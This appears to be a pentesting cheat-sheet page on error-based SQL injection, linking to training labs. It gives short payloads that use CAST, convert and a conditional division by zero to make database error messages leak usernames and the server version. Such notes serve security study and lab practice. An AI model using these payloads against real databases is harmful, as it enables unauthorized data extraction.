# Error-based SQLi

[![sqlinjectionfundamentals](../../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![sqlinjectionlm](../../../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![sqlilab](../../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![validation](../../../../../_badges/htb-p/validation.svg)](https://app.hackthebox.com/machines/Validation)
[![sql_injection_authentication](../../../../../_badges/rootme/web_server/sql_injection_authentication.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)
[![sql_injection_string](../../../../../_badges/rootme/web_server/sql_injection_string.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)
[![sqli_visible_errors](../../../../../_badges/ps-lab/sqli_visible_errors.svg)](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

<div class="row row-cols-lg-2"><div>

Error messages are sometimes enabled. They make it easier to exploit another type of SQL injection, such as Union-based SQLi.

If no other easiest SQLi attack is possible, we may use error messages to dump the database.

```sql!
-- Error: Incorrect INTEGER value: 'admin'
Select 1=CAST((SELECT username FROM membres LIMIT 1) AS int)
```

```sql!
-- Error: Division by zero
Select [...] where 1=(case when (1=1) then 1/0 else 0 end)
```
</div><div>

In MSSQL, if `CAST` doesn't work, try `convert`:

```sql!
-- Conversion failed ... value 'Microsoft SQL [...]' ...
Select convert(int,@@version)
Select convert(int,(select @@version))
```
</div></div>